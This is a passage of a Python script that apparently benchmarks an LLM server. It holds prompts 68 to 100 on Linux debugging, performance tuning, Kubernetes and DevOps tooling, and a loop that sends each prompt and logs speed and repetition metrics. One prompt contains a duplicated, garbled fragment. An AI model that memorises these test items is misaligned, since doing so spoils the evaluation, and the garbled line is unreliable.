3. Trace policy enforcement failures and RBAC denials
4. Monitor sidecar injection failures and pod readiness
5. Analyze circuit breaker and retry policy effectiveness
6. Debug service discovery and endpoint propagation
7. Monitor control plane to data plane communication
8. Analyze telemetry data collection overhead
9. Debug traffic splitting and canary deployment issues
10. Generate mesh configuration optimization recommendations
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 69: JVM Production Debugging",
        "prompt": """
Build a production JVM debugging and analysis toolkit:
1. Attach to running JVM using JVM TI without stopping it
2. Analyze thread dumps for deadlocks and contention
3. Monitor GC behavior and predict out-of-memory conditions
4. Track method-level CPU usage using async-profiler
5. Analyze heap dumps for memory leaks using MAT algorithms
6. Monitor JIT compilation and deoptimization events
7. Track native memory usage including direct buffers
8. Analyze class loading patterns and metaspace usage
9. Debug JNI issues and native crashes
10. Generate performance tuning recommendations
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 70: BGP Routing Anomaly Detection",
        "prompt": """
Implement a BGP routing anomaly detection system:
1. Monitor BGP session states and flapping patterns
2. Detect route hijacking attempts using RPKI validation
3. Analyze AS path anomalies and routing loops
4. Track prefix announcement changes and leaks
5. Monitor convergence time during routing changes
6. Detect BGP optimizer or traffic engineering anomalies
7. Analyze community attribute usage and policies
8. Monitor route dampening and its impact
9. Track IPv6 vs IPv4 routing consistency
10. Generate alerts for routing security incidents
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 71: Distributed Lock Debugging",
        "prompt": """
Create a distributed lock debugging and analysis system:
1. Monitor lock acquisition patterns across distributed systems
2. Detect deadlocks in distributed locking mechanisms
3. Track lock hold times and identify long-running transactions
4. Analyze lock contention and fairness issues
5. Monitor Zookeeper/etcd/Consul lock performance
6. Detect orphaned locks from crashed clients
7. Implement lock timeout and renewal debugging
8. Track distributed transaction coordination issues
9. Analyze optimistic vs pessimistic locking performance
10. Generate locking strategy optimization recommendations
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 72: Cloud Resource Optimization",
        "prompt": """
Build a cloud resource waste detection and optimization system:
1. Identify idle or underutilized compute instances
2. Detect unattached storage volumes and snapshots
3. Analyze network transfer costs and optimize routing
4. Identify over-provisioned databases and caches
5. Track reserved instance utilization and recommendations
6. Monitor spot instance interruptions and fallback strategies
7. Analyze auto-scaling effectiveness and thresholds
8. Detect orphaned resources from failed deployments
9. Optimize storage classes based on access patterns
10. Generate cost optimization report with specific actions
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 73: Kafka Production Issues",
        "prompt": """
Debug and resolve Kafka production issues:
1. Analyze partition leadership imbalances and broker hotspots
2. Debug consumer lag and identify slow consumers
3. Monitor ISR (In-Sync Replica) shrinking and expansion
4. Analyze log segment rotation and retention issues
5. Debug producer timeouts and batch sizing problems
6. Monitor controller failover and metadata propagation
7. Analyze topic compaction effectiveness and tombstones
8. Debug exactly-once semantics violations
9. Monitor broker JVM and OS-level metrics
10. Generate cluster rebalancing and optimization plan
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 74: DNS Infrastructure Debugging",
        "prompt": """
Create a comprehensive DNS infrastructure debugging toolkit:
1. Trace DNS query path through recursive and authoritative servers
2. Detect DNS cache poisoning attempts and validation failures
3. Analyze DNSSEC chain of trust and signature validation
4. Monitor DNS query patterns for DDoS and amplification attacks
5. Debug GeoDNS and anycast routing issues
6. Analyze DNS load balancing effectiveness
7. Track NXDOMAIN rates and potential typosquatting
8. Monitor zone transfer security and AXFR/IXFR issues
9. Debug EDNS and TCP fallback problems
10. Generate DNS infrastructure hardening recommendations
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 75: Production Incident Automation",
        "prompt": """
Build an intelligent incident response automation system:
1. Correlate alerts from multiple monitoring systems
2. Implement intelligent alert deduplication and grouping
3. Automatically gather diagnostic data based on alert type
4. Execute safe automated remediation for known issues
5. Track incident patterns and predict future occurrences
6. Implement escalation policies with intelligent routing
7. Generate incident timelines with automatic RCA
8. Track MTTR and identify automation opportunities
9. Implement chaos testing based on past incidents
10. Generate post-incident improvement recommendations
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },

    # ========== PERFORMANCE OPTIMIZATION TESTS (76-90) ==========
    {
        "name": "Test 76: NUMA-Aware Application Tuning",
        "prompt": """
Create a script to optimize a memory-intensive application on a NUMA system:
1. Detect NUMA topology using numactl and /sys/devices/system/node
2. Analyze current memory allocation patterns via /proc/PID/numa_maps
3. Calculate optimal CPU affinity based on memory locality
4. Implement transparent huge pages tuning per NUMA node
5. Set up cgroups v2 with NUMA-aware memory limits
6. Monitor cross-NUMA memory access using perf stat
7. Track page migration7. Track page migration statistics and costs
8. Implement memory interleaving strategies for shared data
9. Generate systemd service drop-in files with optimized NUMA bindings
10. Create performance comparison report before/after optimization
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 77: CPU Cache Optimization",
        "prompt": """
Build a CPU cache performance optimization toolkit:
1. Analyze cache miss rates using perf stat for L1/L2/L3
2. Identify false sharing issues using cache line analysis
3. Optimize data structure layout for cache efficiency
4. Implement cache coloring for reduced conflicts
5. Monitor cache coherency traffic between cores
6. Analyze prefetcher effectiveness and tuning
7. Track TLB misses and huge page opportunities
8. Implement cache-aware thread scheduling
9. Monitor impact of CPU frequency scaling on cache
10. Generate cache optimization recommendations with benchmarks
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 78: I/O Scheduler Optimization",
        "prompt": """
Create an I/O scheduler tuning and optimization system:
1. Analyze workload patterns (sequential vs random, read vs write)
2. Test different schedulers (mq-deadline, bfq, kyber, none)
3. Optimize scheduler parameters based on workload
4. Monitor I/O latency distribution and tail latencies
5. Implement workload-specific queue depth tuning
6. Analyze impact of I/O scheduling on different storage types
7. Track request merging efficiency
8. Monitor writeback behavior and dirty page thresholds
9. Implement cgroup-based I/O prioritization
10. Generate I/O optimization report with benchmarks
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 79: Network Stack Tuning",
        "prompt": """
Implement comprehensive network stack optimization:
1. Analyze network workload characteristics
2. Optimize ring buffer sizes for packet processing
3. Implement RSS/RPS/RFS for multi-queue NICs
4. Tune TCP buffer sizes and congestion control
5. Optimize interrupt coalescing parameters
6. Implement XDP for high-performance packet processing
7. Monitor and tune netfilter/iptables performance
8. Optimize NUMA affinity for network interrupts
9. Implement kernel bypass for appropriate workloads
10. Generate network performance tuning report
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 80: Database Connection Pool Optimization",
        "prompt": """
Build a database connection pool analyzer and optimizer:
1. Monitor connection lifecycle and usage patterns
2. Detect connection leaks and long-running transactions
3. Analyze wait times for connection acquisition
4. Optimize pool size based on workload patterns
5. Implement predictive scaling for connection pools
6. Track connection health and automatic recovery
7. Monitor prepared statement cache efficiency
8. Analyze connection multiplexing opportunities
9. Implement per-service pool isolation
10. Generate pool configuration recommendations
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 81: Compiler Optimization Analysis",
        "prompt": """
Create a compiler optimization analysis toolkit:
1. Analyze binary code generation with objdump
2. Identify missed optimization opportunities
3. Profile guided optimization (PGO) implementation
4. Link time optimization (LTO) analysis
5. Vectorization opportunity detection
6. Function inlining analysis and tuning
7. Branch prediction optimization
8. Cache-aware code layout optimization
9. Compare different compiler optimization levels
10. Generate optimization report with performance impact
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 82: Container Resource Optimization",
        "prompt": """
Implement container resource optimization system:
1. Analyze container resource usage patterns over time
2. Identify over-provisioned CPU/memory limits
3. Optimize Java heap sizes within containers
4. Implement vertical pod autoscaling recommendations
5. Analyze container startup time optimization
6. Optimize base image layers and caching
7. Implement resource quota optimization
8. Monitor and optimize init containers
9. Analyze sidecar container overhead
10. Generate right-sizing recommendations
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 83: Storage Performance Tuning",
        "prompt": """
Build a comprehensive storage performance tuning system:
1. Analyze filesystem alignment with storage geometry
2. Optimize RAID parameters for workload
3. Implement SSD wear leveling monitoring
4. Tune readahead settings based on access patterns
5. Optimize journal placement and size
6. Implement extent allocation optimization
7. Monitor and tune dirty page writeback
8. Analyze and optimize snapshot overhead
9. Implement storage tiering recommendations
10. Generate storage optimization report
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 84: Power Management Optimization",
        "prompt": """
Create a power management optimization system:
1. Analyze CPU frequency scaling governors
2. Monitor C-state residency and transitions
3. Optimize interrupt routing for power efficiency
4. Implement workload consolidation strategies
5. Analyze power consumption vs performance trade-offs
6. Monitor thermal throttling impact
7. Optimize GPU power management
8. Implement wake-on-LAN optimization
9. Analyze peripheral device power usage
10. Generate power optimization recommendations
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 85: Memory Allocator Optimization",
        "prompt": """
Build a memory allocator analysis and optimization toolkit:
1. Compare different allocators (glibc, jemalloc, tcmalloc)
2. Analyze allocation patterns and fragmentation
3. Implement arena tuning for multi-threaded apps
4. Monitor allocation hot paths
5. Optimize for NUMA awareness
6. Implement custom allocation pools
7. Analyze memory bandwidth utilization
8. Monitor false sharing in allocations
9. Implement allocation tracing with low overhead
10. Generate allocator tuning recommendations
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 86: Kernel Parameter Optimization",
        "prompt": """
Create a kernel parameter optimization system:
1. Analyze current sysctl settings
2. Benchmark impact of key parameters
3. Optimize VM subsystem parameters
4. Tune network stack sysctls
5. Optimize scheduler parameters
6. Implement security vs performance trade-offs
7. Monitor parameter changes impact
8. Create workload-specific profiles
9. Implement automatic tuning based on workload
10. Generate kernel tuning recommendations
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 87: Application Thread Pool Optimization",
        "prompt": """
Build a thread pool optimization system:
1. Monitor thread pool utilization and queue depths
2. Analyze task execution times and patterns
3. Detect thread pool starvation
4. Optimize pool sizes based on workload
5. Implement work stealing optimization
6. Monitor context switch overhead
7. Analyze thread affinity benefits
8. Implement dynamic pool sizing
9. Monitor and prevent thread leaks
10. Generate thread pool configuration recommendations
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 88: Distributed Cache Optimization",
        "prompt": """
Create a distributed cache optimization toolkit:
1. Analyze cache hit rates and miss patterns
2. Optimize cache key distribution
3. Implement cache warming strategies
4. Monitor cache eviction patterns
5. Optimize serialization overhead
6. Implement multi-tier caching
7. Analyze network overhead for cache operations
8. Monitor cache coherency overhead
9. Implement predictive cache prefetching
10. Generate cache optimization recommendations
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 89: Load Balancer Optimization",
        "prompt": """
Implement load balancer optimization system:
1. Analyze request distribution patterns
2. Optimize health check intervals and timeouts
3. Implement least-connection vs round-robin analysis
4. Monitor connection reuse efficiency
5. Optimize session persistence strategies
6. Implement geographic load balancing
7. Analyze SSL termination overhead
8. Monitor WebSocket connection distribution
9. Implement circuit breaker optimization
10. Generate load balancing recommendations
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 90: Query Optimizer Tuning",
        "prompt": """
Build a database query optimizer tuning system:
1. Analyze query execution plans
2. Identify missing indexes and statistics
3. Optimize join order and methods
4. Implement query rewriting recommendations
5. Monitor parameter sniffing issues
6. Analyze partition pruning effectiveness
7. Optimize aggregate computations
8. Implement materialized view recommendations
9. Monitor query cache effectiveness
10. Generate query optimization report
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },

    # ========== INTEGRATION TESTS WITH MODERN TOOLS (91-100) ==========
    {
        "name": "Test 91: eBPF Security Monitor",
        "prompt": """
Write a comprehensive eBPF-based security monitoring system using libbpf:
1. Hook security_file_open to track all file access with process context
2. Monitor privilege escalation via setuid/setgid/setcap calls
3. Track network connections with full process attribution
4. Detect container escapes by monitoring namespace operations
5. Implement syscall anomaly detection using sliding window statistics
6. Monitor kernel module operations and block unauthorized loading
7. Track memory protection changes (mprotect, mmap with PROT_EXEC)
8. Implement a ring buffer for high-performance event streaming
9. Create userspace daemon for event correlation and alerting
10. Generate security events in CEF format for SIEM integration
Provide both the BPF C code and Python userspace component.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 92: Kubernetes Operator Development",
        "prompt": """
Create a Kubernetes operator for automated database backup management:
1. Define CRDs for BackupPolicy and BackupJob resources
2. Implement controller logic using controller-runtime
3. Watch for database pods and automatically create backups
4. Handle backup scheduling with cron expressions
5. Implement backup retention policies
6. Store backups in multiple backends (S3, GCS, Azure)
7. Implement point-in-time recovery capabilities
8. Add Prometheus metrics for backup status
9. Implement webhook validation for CRDs
10. Handle operator upgrades without disrupting backups
Include full Go code and Kubernetes manifests.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 93: Service Mesh Advanced Configuration",
        "prompt": """
Implement advanced Istio service mesh configurations:
1. Create WASM filters for custom request/response manipulation
2. Implement multi-cluster service discovery and routing
3. Configure advanced circuit breaking with adaptive thresholds
4. Implement canary deployments with automatic rollback
5. Create custom authorization policies with OPA integration
6. Configure distributed tracing with baggage propagation
7. Implement traffic mirroring for testing
8. Configure mutual TLS with cert rotation
9. Implement rate limiting with Redis backend
10. Create observability dashboards with Grafana
Include all YAML configurations and custom code.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 94: Terraform Infrastructure Testing",
        "prompt": """
Build a comprehensive Terraform testing framework:
1. Implement unit tests using terraform-plugin-testing
2. Create integration tests with kitchen-terraform
3. Implement compliance testing with OPA policies
4. Build cost estimation and optimization checks
5. Create security scanning with tfsec integration
6. Implement drift detection and auto-remediation
7. Build module dependency analysis
8. Create performance testing for large infrastructures
9. Implement blue-green deployment testing
10. Generate test coverage reports
Include example modules and full test suites.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 95: GitOps Pipeline Implementation",
        "prompt": """
Create a complete GitOps pipeline with ArgoCD:
1. Implement application manifests with Kustomize
2. Create ApplicationSets for multi-environment deployments
3. Implement secrets management with Sealed Secrets
4. Configure automated image updates with Flux
5. Implement progressive delivery with Flagger
6. Create custom health checks for applications
7. Implement RBAC policies for multi-tenant clusters
8. Configure notifications to multiple channels
9. Implement disaster recovery procedures
10. Create monitoring for GitOps metrics
Include all configurations and automation scripts.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 96: Observability Platform Integration",
        "prompt": """
Build a unified observability platform integration:
1. Implement OpenTelemetry collectors with custom processors
2. Create log aggregation with Fluentd/Fluent Bit
3. Implement distributed tracing correlation
4. Build custom Prometheus exporters
5. Create synthetic monitoring with Playwright
6. Implement SLO/SLI tracking with burn rate alerts
7. Build anomaly detection using Prophet
8. Create custom Grafana panels with plugins
9. Implement event correlation across signals
10. Build automated root cause analysis
Include all configurations and custom code.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 97: Cloud Native CI/CD Pipeline",
        "prompt": """
Create a cloud-native CI/CD pipeline with Tekton:
1. Define reusable Tasks for common operations
2. Implement Pipelines with conditional execution
3. Create custom ClusterTasks for security scanning
4. Implement GitOps integration with automatic PR creation
5. Build multi-arch image support
6. Implement SBOM generation and signing
7. Create quality gates with automatic rollback
8. Implement cost tracking for builds
9. Create custom dashboard for pipeline metrics
10. Implement ChatOps integration
Include all YAML definitions and custom images.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 98: Chaos Engineering Platform",
        "prompt": """
Build a comprehensive chaos engineering platform:
1. Implement custom chaos experiments with Litmus
2. Create GameDay automation scenarios
3. Build steady-state hypothesis validation
4. Implement blast radius control
5. Create automated rollback on SLO breach
6. Build chaos experiment scheduling
7. Implement security chaos experiments
8. Create cost-aware chaos experiments
9. Build reporting and analytics dashboard
10. Implement learning loop automation
Include experiment definitions and platform code.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 99: Policy as Code Framework",
        "prompt": """
Create a comprehensive policy as code framework:
1. Implement OPA policies for Kubernetes admission
2. Create Falco rules for runtime security
3. Build Sentinel policies for Terraform
4. Implement CUE schemas for configuration validation
5. Create policy testing frameworks
6. Build policy violation remediation
7. Implement policy versioning and rollback
8. Create compliance reporting dashboards
9. Build policy simulation environments
10. Implement policy performance optimization
Include all policy definitions and tooling.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 100: Platform Engineering Toolkit",
        "prompt": """
Build a complete platform engineering toolkit:
1. Create developer portal with Backstage
2. Implement service catalog with templates
3. Build automated environment provisioning
4. Create cost allocation and showback
5. Implement developer productivity metrics
6. Build self-service infrastructure
7. Create platform API abstractions
8. Implement golden paths for common use cases
9. Build platform health dashboard
10. Create platform documentation generator
Include all code, configurations, and templates.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    }
]

def run_performance_test(test_case):
    """Sends a request to the server for a given test case and prints performance metrics."""
    
    name = test_case["name"]
    prompt = test_case["prompt"]
    params = test_case["params"]
    
    print(f"\n{'='*80}\n--- 🚀 RUNNING: {name} ---\n{'='*80}")
    
    # Print prompt
    print("--- Prompt ---")
    print(prompt.strip())
    print("-" * 40)

    payload = {
        "messages": [{"role": "user", "content": prompt}],
        **params
    }
    
    try:
        start_time = time.time()
        response = requests.post(API_URL, headers=HEADERS, json=payload, timeout=1500)
        response.raise_for_status()
        end_time = time.time()

        response_data = response.json()
        
        print("\n--- ✅ SUCCESS: Server Responded ---")
        
        # --- Performance Metrics ---
        total_duration = end_time - start_time
        usage_data = response_data.get("usage", {})
        completion_tokens = usage_data.get("completion_tokens", 0)
        prompt_tokens = usage_data.get("prompt_tokens", 0)
        total_tokens = usage_data.get("total_tokens", 0)
        
        print(f"\n--- 📊 Performance Metrics ---")
        print(f"Total Request Time: {total_duration:.2f} seconds")
        print(f"Prompt Tokens: {prompt_tokens} | Completion Tokens: {completion_tokens} | Total Tokens: {total_tokens}")
        
        tokens_per_second = 0
        if completion_tokens > 0 and total_duration > 0:
            tokens_per_second = completion_tokens / total_duration
            print(f"Tokens per Second (T/s): {tokens_per_second:.2f}")
        else:
            print("Tokens per Second (T/s): N/A")

        # --- Response Quality Check ---
        full_content = response_data.get("choices", [{}])[0].get("message", {}).get("content", "")
        
        repetition_ratio = 1.0 # Default to no repetition
        lines = full_content.split('\n')
        if len(lines) > 10:
            unique_lines = len(set(l for l in lines if l.strip()))
            total_lines = len([l for l in lines if l.strip()])
            if total_lines > 0:
                repetition_ratio = unique_lines / total_lines
                if repetition_ratio < 0.4:
                    print("⚠️  WARNING: High repetition detected in response")
        
        if full_content.count('```') % 2 != 0:
            print("⚠️  WARNING: Unclosed code block detected")
            
        # Save Response
        filename_safe_name = name.lower().replace(":", "").replace(" ", "_")
        output_path = os.path.join("test_results", f"{filename_safe_name}_response.txt")
        
        with open(output_path, "w", encoding="utf-8") as f:
            f.write(full_content)
                
        print(f"\n--- 📜 Response Preview ---")
        print(textwrap.shorten(full_content, width=400, placeholder="..."))
        print(f"\n--- Full response saved to '{output_path}' ---")

        # --- Performance Summary ---
        with open(os.path.join("test_results", "performance_summary.txt"), "a", encoding="utf-8") as f:
            f.write(f"\n{name}\n")
            f.write(f"Duration: {total_duration:.2f}s | ")
            f.write(f"Tokens: {completion_tokens} | ") # Changed to completion tokens for T/s consistency
            if tokens_per_second > 0:
                f.write(f"T/s: {tokens_per_second:.2f}")
                if repetition_ratio < 0.4:
                    f.write(" [HIGH REPETITION]")
            else:
                f.write(f"T/s: N/A")
            f.write("\n")
            f.write("-" * 80)

        return True

    except requests.exceptions.Timeout:
        print(f"\n❌ ERROR: The request for '{name}' timed out.")
        return False
    except requests.exceptions.RequestException as e:
        print(f"\n❌ ERROR: Could not connect to the server for '{name}'.")
        print(f"   Details: {e}")
        return False
    except Exception as e:
        print(f"\n❌ An unexpected error occurred during '{name}': {e}")
        return False

if __name__ == "__main__":
    print("--- Advanced Linux Agent Test Suite (100 Complex Challenges) ---")
    print(f"Targeting Server: {API_URL}")
    print(f"Total Tests: {len(TEST_CASES)}")
    print("\nTest Design Philosophy:")
    print("- Complex, multi-step problems requiring deep Linux expertise")
    print("- Heavy emphasis on kernel internals, system debugging, and optimization")
    print("- Large context tests (10k+ tokens) for real-world troubleshooting")
    print("- Modern tooling: eBPF, Kubernetes operators, service mesh, GitOps")
    print("- Production incident scenarios requiring precise technical knowledge")
    
    summary_file = os.path.join("test_results", "performance_summary.txt")
    with open(summary_file, "w", encoding="utf-8") as f:
        f.write("=== ADVANCED LINUX AGENT TEST SUITE - PERFORMANCE SUMMARY ===\n")
        f.write(f"Start Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("=" * 80)
    
    successful_tests = 0
    failed_tests = 0
    
    start_time_total = time.time()
    for i, test in enumerate(TEST_CASES):
        print(f"\n\n[{i+1}/{len(TEST_CASES)}] Starting test...")
        if run_performance_test(test):
            successful_tests += 1
        else:
            failed_tests += 1
        
        time.sleep(1) # Small delay between tests
    
    end_time_total = time.time()
    total_suite_duration = end_time_total - start_time_total

    # Final Summary
    print(f"\n{'='*80}")
    print(f"--- 📈 FINAL SUMMARY ---")
    print(f"Total Suite Duration: {total_suite_duration:.2f} seconds")
    print(f"Total Tests: {len(TEST_CASES)}")
    print(f"Successful: {successful_tests}")
    print(f"Failed: {failed_tests}")
    success_rate = (successful_tests / len(TEST_CASES)) * 100 if len(TEST_CASES) > 0 else 0
    print(f"Success Rate: {success_rate:.1f}%")
    print(f"\n--- ✅ Test suite completed. Check '{summary_file}' for summary. ---")
    print(f"{'='*80}")
    
    # Append summary to file
    with open(summary_file, "a", encoding="utf-8") as f:
        f.write(f"\n\nFINAL SUMMARY\n")
        f.write(f"End Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Total Suite Duration: {total_suite_duration:.2f} seconds\n")
        f.write(f"Total Tests: {len(TEST_CASES)}\n")
        f.write(f"Successful: {successful_tests}\n")
        f.write(f"Failed: {failed_tests}\n")
        f.write(f"Success Rate: {success_rate:.1f}%\n")